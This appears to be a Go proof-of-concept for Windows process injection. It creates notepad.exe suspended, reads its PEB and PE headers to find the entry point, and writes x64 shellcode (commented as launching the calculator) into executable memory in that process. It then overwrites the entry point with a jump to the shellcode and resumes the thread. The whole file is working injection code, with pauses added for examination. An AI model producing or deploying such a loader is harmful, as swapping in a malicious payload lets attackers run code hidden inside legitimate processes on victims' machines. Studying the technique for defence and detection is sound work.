package main

import (
	"fmt"
	"unsafe"

	"golang.org/x/sys/windows"
)

var (
	kernel32                  = windows.NewLazyDLL("kernel32.dll")
	procVirtualAllocEx        = kernel32.NewProc("VirtualAllocEx")
	procVirtualProtectEx      = kernel32.NewProc("VirtualProtectEx")
	procFlushInstructionCache = kernel32.NewProc("FlushInstructionCache")
)

// Constants for memory protection and allocation
const (
	MEM_COMMIT  = 0x00001000
	MEM_RESERVE = 0x00002000

	PAGE_EXECUTE_READWRITE = 0x40
	PAGE_EXECUTE_READ      = 0x20
)

// Function declarations
func VirtualAllocEx(process windows.Handle, lpAddress uintptr, dwSize uintptr, flAllocationType uint32, flProtect uint32) (uintptr, error) {
	r1, _, err := procVirtualAllocEx.Call(
		uintptr(process),
		lpAddress,
		dwSize,
		uintptr(flAllocationType),
		uintptr(flProtect))

	if r1 == 0 {
		return 0, fmt.Errorf("VirtualAllocEx failed: %v", err)
	}

	return r1, nil
}

func VirtualProtectEx(process windows.Handle, lpAddress uintptr, dwSize uintptr, flNewProtect uint32, lpflOldProtect *uint32) error {
	r1, _, err := procVirtualProtectEx.Call(
		uintptr(process),
		lpAddress,
		dwSize,
		uintptr(flNewProtect),
		uintptr(unsafe.Pointer(lpflOldProtect)))

	if r1 == 0 {
		return fmt.Errorf("VirtualProtectEx failed: %v", err)
	}

	return nil
}

func FlushInstructionCache(process windows.Handle, lpBaseAddress uintptr, dwSize uintptr) error {
	r1, _, err := procFlushInstructionCache.Call(
		uintptr(process),
		lpBaseAddress,
		dwSize)

	if r1 == 0 {
		return fmt.Errorf("FlushInstructionCache failed: %v", err)
	}

	return nil
}

// Create a JMP instruction to the given address (for x64)
func createJmpToInstruction(targetAddr uintptr) []byte {

	jmpCode := make([]byte, 12)
	jmpCode[0] = 0x48
	jmpCode[1] = 0xB8

	// Copy target address to the instruction
	targetAddrBytes := (*[8]byte)(unsafe.Pointer(&targetAddr))
	copy(jmpCode[2:10], targetAddrBytes[:])

	jmpCode[10] = 0xFF
	jmpCode[11] = 0xE0

	return jmpCode
}

func main() {
	targetPath := windows.StringToUTF16Ptr("C:\\Windows\\System32\\notepad.exe")
	var pi windows.ProcessInformation
	var si windows.StartupInfo
	si.Cb = uint32(unsafe.Sizeof(si))

	// Create the process in a suspended state
	err := windows.CreateProcess(
		nil,                      // lpApplicationName
		targetPath,               // lpCommandLine
		nil,                      // lpProcessAttributes
		nil,                      // lpThreadAttributes
		false,                    // bInheritHandles
		windows.CREATE_SUSPENDED, // dwCreationFlags
		nil,                      // lpEnvironment
		nil,                      // lpCurrentDirectory
		&si,                      // lpStartupInfo
		&pi)                      // lpProcessInformation

	if err != nil {
		fmt.Printf("[!] CreateProcess failed: %v\n", err)
		return
	}
	defer func() {
		windows.TerminateProcess(pi.Process, 1)
		windows.CloseHandle(pi.Thread)
		windows.CloseHandle(pi.Process)
	}()

	// Get basic process information
	var pbi windows.PROCESS_BASIC_INFORMATION
	var returnLen uint32
	res := windows.NtQueryInformationProcess(
		pi.Process,
		windows.ProcessBasicInformation,
		unsafe.Pointer(&pbi),
		uint32(unsafe.Sizeof(pbi)),
		&returnLen)

	if res != nil {
		fmt.Printf("[!] NtQueryInformationProcess failed\n")
		return
	}

	// Read the ImageBaseAddress from the PEB
	pebAddr := uintptr(unsafe.Pointer(pbi.PebBaseAddress))
	imageBaseAddrPtr := pebAddr + 0x10
	var imageBaseAddr uintptr
	var bytesRead uintptr

	err = windows.ReadProcessMemory(
		pi.Process,
		imageBaseAddrPtr,
		(*byte)(unsafe.Pointer(&imageBaseAddr)),
		unsafe.Sizeof(imageBaseAddr),
		&bytesRead)

	if err != nil {
		fmt.Printf("[!] ReadProcessMemory failed: %v\n", err)
		return
	}

	// Find the entry point
	var e_lfanew uint32
	err = windows.ReadProcessMemory(
		pi.Process,
		imageBaseAddr+0x3C,
		(*byte)(unsafe.Pointer(&e_lfanew)),
		unsafe.Sizeof(e_lfanew),
		&bytesRead)

	if err != nil {
		fmt.Printf("[!] Failed to read e_lfanew: %v\n", err)
		return
	}

	peHeaderAddr := imageBaseAddr + uintptr(e_lfanew)
	addressOfEntryPointOffset := peHeaderAddr + 0x28
	var addressOfEntryPoint uint32

	err = windows.ReadProcessMemory(
		pi.Process,
		addressOfEntryPointOffset,
		(*byte)(unsafe.Pointer(&addressOfEntryPoint)),
		unsafe.Sizeof(addressOfEntryPoint),
		&bytesRead)

	if err != nil {
		fmt.Printf("[!] Failed to read AddressOfEntryPoint: %v\n", err)
		return
	}

	entryPointAddr := imageBaseAddr + uintptr(addressOfEntryPoint)

	// Shellcode to inject (calculator launcher)
	shellcode := []byte{
		0x48, 0x31, 0xff, 0x48, 0xf7, 0xe7, 0x65, 0x48, 0x8b, 0x58, 0x60, 0x48, 0x8b, 0x5b, 0x18, 0x48,
		0x8b, 0x5b, 0x20, 0x48, 0x8b, 0x1b, 0x48, 0x8b, 0x1b, 0x48, 0x8b, 0x5b, 0x20, 0x49, 0x89, 0xd8,
		0x8b, 0x5b, 0x3c, 0x4c, 0x01, 0xc3, 0x48, 0x31, 0xc9, 0x66, 0x81, 0xc1, 0xff, 0x88, 0x48, 0xc1,
		0xe9, 0x08, 0x8b, 0x14, 0x0b, 0x4c, 0x01, 0xc2, 0x4d, 0x31, 0xd2, 0x44, 0x8b, 0x52, 0x1c, 0x4d,
		0x01, 0xc2, 0x4d, 0x31, 0xdb, 0x44, 0x8b, 0x5a, 0x20, 0x4d, 0x01, 0xc3, 0x4d, 0x31, 0xe4, 0x44,
		0x8b, 0x62, 0x24, 0x4d, 0x01, 0xc4, 0xeb, 0x32, 0x5b, 0x59, 0x48, 0x31, 0xc0, 0x48, 0x89, 0xe2,
		0x51, 0x48, 0x8b, 0x0c, 0x24, 0x48, 0x31, 0xff, 0x41, 0x8b, 0x3c, 0x83, 0x4c, 0x01, 0xc7, 0x48,
		0x89, 0xd6, 0xf3, 0xa6, 0x74, 0x05, 0x48, 0xff, 0xc0, 0xeb, 0xe6, 0x59, 0x66, 0x41, 0x8b, 0x04,
		0x44, 0x41, 0x8b, 0x04, 0x82, 0x4c, 0x01, 0xc0, 0x53, 0xc3, 0x48, 0x31, 0xc9, 0x80, 0xc1, 0x07,
		0x48, 0xb8, 0x0f, 0xa8, 0x96, 0x91, 0xba, 0x87, 0x9a, 0x9c, 0x48, 0xf7, 0xd0, 0x48, 0xc1, 0xe8,
		0x08, 0x50, 0x51, 0xe8, 0xb0, 0xff, 0xff, 0xff, 0x49, 0x89, 0xc6, 0x48, 0x31, 0xc9, 0x48, 0xf7,
		0xe1, 0x50, 0x48, 0xb8, 0x9c, 0x9e, 0x93, 0x9c, 0xd1, 0x9a, 0x87, 0x9a, 0x48, 0xf7, 0xd0, 0x50,
		0x48, 0x89, 0xe1, 0x48, 0xff, 0xc2, 0x48, 0x83, 0xec, 0x20, 0x41, 0xff, 0xd6,
	}

	// Allocate memory for our shellcode
	shellcodeAddr, err := VirtualAllocEx(
		pi.Process,
		0, // Let Windows choose the address
		uintptr(len(shellcode)),
		MEM_COMMIT|MEM_RESERVE,
		PAGE_EXECUTE_READWRITE)

	if err != nil {
		fmt.Printf("[!] VirtualAllocEx failed: %v\n", err)
		return
	}

	// Write shellcode to the allocated memory
	var bytesWritten uintptr
	err = windows.WriteProcessMemory(
		pi.Process,
		shellcodeAddr,
		&shellcode[0],
		uintptr(len(shellcode)),
		&bytesWritten)

	if err != nil || bytesWritten != uintptr(len(shellcode)) {
		fmt.Printf("[!] WriteProcessMemory failed: %v\n", err)
		return
	}

	// Read original instruction bytes at entry point
	originalEntryPointBytes := make([]byte, 12)
	err = windows.ReadProcessMemory(
		pi.Process,
		entryPointAddr,
		&originalEntryPointBytes[0],
		uintptr(len(originalEntryPointBytes)),
		&bytesWritten)

	if err != nil {
		fmt.Printf("[!] Failed to read original entry point instructions\n")
	}

	// PAUSE HERE FOR EXAMINATION
	fmt.Println("[*] Press Enter to continue with entry point patching...")
	fmt.Scanln()

	// Create JMP instruction to our shellcode
	jmpInstruction := createJmpToInstruction(shellcodeAddr)

	// Change memory protection at entry point to allow writing
	var oldProtect uint32
	err = VirtualProtectEx(
		pi.Process,
		entryPointAddr,
		uintptr(len(jmpInstruction)),
		PAGE_EXECUTE_READWRITE,
		&oldProtect)

	if err != nil {
		fmt.Printf("[!] VirtualProtectEx failed: %v\n", err)
		return
	}

	// Write JMP instruction at the entry point
	err = windows.WriteProcessMemory(
		pi.Process,
		entryPointAddr,
		&jmpInstruction[0],
		uintptr(len(jmpInstruction)),
		&bytesWritten)

	if err != nil || bytesWritten != uintptr(len(jmpInstruction)) {
		fmt.Printf("[!] WriteProcessMemory failed for JMP instruction\n")
		return
	}

	// Restore original memory protection
	err = VirtualProtectEx(
		pi.Process,
		entryPointAddr,
		uintptr(len(jmpInstruction)),
		oldProtect,
		&oldProtect)

	// Flush instruction cache
	FlushInstructionCache(pi.Process, entryPointAddr, uintptr(len(jmpInstruction)))

	// PAUSE AGAIN FOR EXAMINATION
	fmt.Println("[*] Press Enter to resume the thread and execute the shellcode...")
	fmt.Scanln()

	// Resume the suspended thread
	_, err = windows.ResumeThread(pi.Thread)
	if err != nil {
		fmt.Printf("[!] ResumeThread failed: %v\n", err)
		return
	}

	fmt.Println("[*] Press Enter to terminate the process...")
	fmt.Scanln()
}
